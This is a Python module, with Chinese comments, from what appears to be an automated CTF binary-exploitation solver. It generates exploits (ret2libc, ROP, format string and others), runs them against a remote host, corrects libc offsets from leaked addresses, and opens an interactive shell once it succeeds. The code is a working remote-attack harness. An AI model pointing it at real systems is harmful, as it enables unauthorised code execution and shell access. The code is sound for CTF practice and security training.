#!/usr/bin/env python3
"""一条命令打远程（内网比赛现场用）：本地生成 → 打远程 → 用远程泄露校正 libc → 再打 → 进交互。

为什么需要单独一层：

1. 生成脚本的远程开关是环境变量（`PWN_HOST`/`PWN_PORT`），手设容易漏；历史上 solver 设的
   还是另一套名字（`PWN_REMOTE_HOST`），所以 `-r` 一直没真正生效。

2. **更关键的是 libc。** 远程靶机的 libc 与本地参考（题目附件/系统兜底）不一致时，整条链的
   偏移都是错的，而求解器的自动重试只在本地跑（`test_with_feedback` 会清空 `PWN_HOST`），
   所以远程必须有一条闭环：打一次 → 收 `[leak] puts=0x...` → 用本地离线索引认出靶机版本
   → 换参考重生成 → 再打。断网环境下这是唯一能自我纠正的手段。

3. 拿到 shell 后再单独跑一次并继承终端，才真正给你交互式 shell（探测那一轮必须用
   stdin=DEVNULL，否则 `p.interactive()` 会把探测卡死）。

用法：
    python3 pwn_solver/solver.py ./vuln --attack 10.0.1.8 9999          # 自动打，成功后进交互
    python3 pwn_solver/solver.py ./vuln --attack 10.0.1.8 9999 --no-interactive
"""
import os
import re
import subprocess
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from utils import exploit_python  # noqa: E402

LEAK_RE = re.compile(r'\[leak\]\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(0x[0-9a-fA-F]+)')
SUCCESS_RE = re.compile(r'(?i)(PWNED_OK|\buid=\d+\(|flag\{[^}]{2,}\})')


def _remote_env(host, port):
    from solver import _remote_env as helper
    return helper((host, port))


class RemoteAttacker:
    """按"生成 → 打远程 → 泄露校正 → 再打"的顺序推进，成功率与可诊断性兼顾。"""

    def __init__(self, solver, host, port, interactive=True, rounds=3,
                 timeout=25, verbose=True):
        self.solver = solver
        self.host = host
        self.port = int(port)
        self.interactive = interactive
        self.rounds = rounds
        self.timeout = timeout
        self.verbose = verbose
        self.history = []

    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    # ------------------------------------------------------------------ 跑
    def _run_script(self, code, timeout=None, interactive=False):
        """跑一份生成的脚本。interactive=True 时继承终端（给用户用的那次）。"""
        fd, path = tempfile.mkstemp(suffix='.py', prefix='pwn_remote_')
        with os.fdopen(fd, 'w') as f:
            f.write(code)
        env = _remote_env(self.host, self.port)
        try:
            if interactive:
                return subprocess.call([exploit_python(), path], env=env,
                                       cwd=os.path.dirname(self.solver.binary_path) or '.')
            # 探测轮：stdin 给 DEVNULL，让脚本里的 p.interactive() 立刻遇到 EOF 返回，
            # 否则它会把整轮探测挂死到超时。
            proc = subprocess.run([exploit_python(), path], env=env,
                                  capture_output=True, text=True,
                                  timeout=timeout or self.timeout,
                                  stdin=subprocess.DEVNULL,
                                  cwd=os.path.dirname(self.solver.binary_path) or '.')
            return proc
        except subprocess.TimeoutExpired as exc:
            out = exc.stdout or b''
            err = exc.stderr or b''
            if isinstance(out, bytes):
                out = out.decode('utf-8', 'ignore')
            if isinstance(err, bytes):
                err = err.decode('utf-8', 'ignore')
            return type('R', (), {'returncode': -999, 'stdout': out, 'stderr': err})()
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass

    @staticmethod
    def _parse(proc):
        text = (proc.stdout or '') + '\n' + (proc.stderr or '')
        leaks = {}
        for m in LEAK_RE.finditer(text):
            leaks[m.group(1)] = int(m.group(2), 16)
        solved = bool(SUCCESS_RE.search(text))
        return {'leaks': leaks, 'solved': solved, 'text': text,
                'timeout': getattr(proc, 'returncode', 0) == -999}

    # ------------------------------------------------------------ 方法顺序
    def _method_order(self):
        """先用判型结果，再按常见顺序兜底；每种都要求前提成立。"""
        order = []
        if self.solver.vuln_type:
            order.append(self.solver.vuln_type[0])
        has_overflow = any(b.get('type') == 'stack_frame'
                           for b in (self.solver._last_analysis or {}).get('buffers', []))
        gadgets = self.solver._last_gadgets or {}
        if self.solver.libc_path:
            order += ['ret2libc', 'one_gadget']
        if has_overflow:
            order.append('ret2win')
        order += ['rop', 'format_string']
        seen, out = set(), []
        for name in order:
            if name and name not in seen:
                seen.add(name)
                out.append(name)
        return out

    # ------------------------------------------------------------------ 主流程
    def attack(self):
        analysis = self.solver.analyze()
        if not analysis:
            self.log('[-] 分析失败')
            return False
        gadgets = self.solver.find_gadgets()
        vuln_type = self.solver.determine_vuln_type(analysis, gadgets)
        self.solver._last_analysis = analysis
        self.solver._last_gadgets = gadgets

        self.log(f'\n🌐 远程目标 {self.host}:{self.port}')
        self.log(f'   本地参考 libc: {os.path.basename(self.solver.libc_path) if self.solver.libc_path else "无"}'
                 f' (来源 {self.solver.libc_source or "?"})')
        if self.solver.libc_suspect:
            self.log('   ⚠ 参考 libc 是本机系统兜底：先打一轮拿泄露，用本地索引认靶机版本')

        methods = self._method_order()
        self.log(f'   方法顺序: {methods[:self.rounds]}')

        for round_no, method in enumerate(methods[:self.rounds], 1):
            self.log(f'\n=== 第 {round_no} 轮：{method} ===')
            self.solver.vuln_type = (method, 70, 'remote-attack')
            code = self.solver.generate_exploit(analysis, gadgets)
            if not code:
                self.log('   [-] 未能生成 exploit，跳过')
                continue
            proc = self._run_script(code)
            info = self._parse(proc)
            self.history.append({'round': round_no, 'method': method, **info})
            if info['timeout']:
                self.log(f'   [-] 超时（>{self.timeout}s）：链可能没打通或目标无响应')
            if info['leaks']:
                self.log('   [leak] ' + ', '.join(f'{k}={hex(v)}'
                                                  for k, v in info['leaks'].items()))
            if info['solved']:
                self.log(f'   ✅ 远程打通（方法 {method}）')
                m = SUCCESS_RE.search(info['text'])
                if m:
                    self.log(f'   证据: {m.group(0)}')
                if self.interactive:
                    self.log('   → 再跑一次并接管终端，进入交互式 shell（exit 退出）')
                    self._run_script(code, interactive=True)
                return True
            # 拿到泄露 → 用本地索引校正参考 libc（允许覆盖题目附件，因为远程才是真靶机）
            if info['leaks'] and self._correct_libc(info['leaks']):
                self.log('   ↻ 参考 libc 已更新，下一轮用新偏移重打')
            else:
                self.log(f'   [-] 未打通（无新的可用信息），换方法')

        self.log('\n[-] 远程打击未成功。下一步建议：')
        self.log('    1) 确认靶机 libc：本地缺 .so 时先用这一轮的 [leak] 跑 '
                 'pwnsolver.py libcdb match --leak puts=0x...');
        self.log('    2) 确认协议/菜单（交互式题目手工跑一次：'
                 'PWN_HOST=%s PWN_PORT=%d python3 exploits/最新那个.py）' % (self.host, self.port))
        self.log('    3) 用 recon 证据看保护与思路：pwnsolver.py recon <bin> --deep-r2')
        return False

    def _correct_libc(self, leaks):
        """用远程泄露在本地离线索引里认靶机 libc；变了就换参考并重建 gadget。"""
        try:
            return self.solver._resolve_libc_from_leaks(leaks, force=True)
        except TypeError:
            # 老签名（无 force）兼容
            return self.solver._resolve_libc_from_leaks(leaks)
